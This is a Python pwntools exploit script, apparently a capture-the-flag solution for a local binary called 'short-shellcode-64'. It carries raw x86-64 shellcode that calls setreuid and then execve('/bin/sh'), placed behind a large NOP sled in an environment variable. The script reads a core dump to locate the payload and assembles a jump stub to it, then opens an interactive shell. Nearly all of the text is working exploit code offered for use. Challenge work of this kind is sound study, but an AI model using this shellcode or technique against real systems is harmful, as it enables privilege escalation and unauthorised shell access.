#! /usr/bin/env python

from pwn import *
import os
mult = 0x186A0
env = {
        'shell' : '\x90' * mult + 'jlX\x0f\x05H\x89\xc7H\x89\xc6jrX\x0f\x05H\xbb//bin/shH1\xffH1\xf6H1\xd2WSH\x89\xe7j;X\x0f\x05',
}

argv = ['./short-shellcode-64', env['shell']]
with open('shellcode.bin', 'wb') as f:
    f.write('ABCDEFGHIJK')
    f.close()

p = process(argv=argv)

if not os.path.exists('./core'):
    p.wait()

c = Core('./core')

addr_env = c.stack.find(env['shell'])
loc = 0x7ffff7ff6000
new_loc = hex(addr_env - loc)
print(hex(addr_env))


temp = "\n#include <sys/syscall.h>\n.globl  main\n.type   main, @function\nmain:\n\tjmp .+%s" % new_loc

with open('shellcode.S', 'wb') as f:
    f.write(temp)
    f.close()

os.system("make 64")

p = process(argv=argv)
p.interactive()
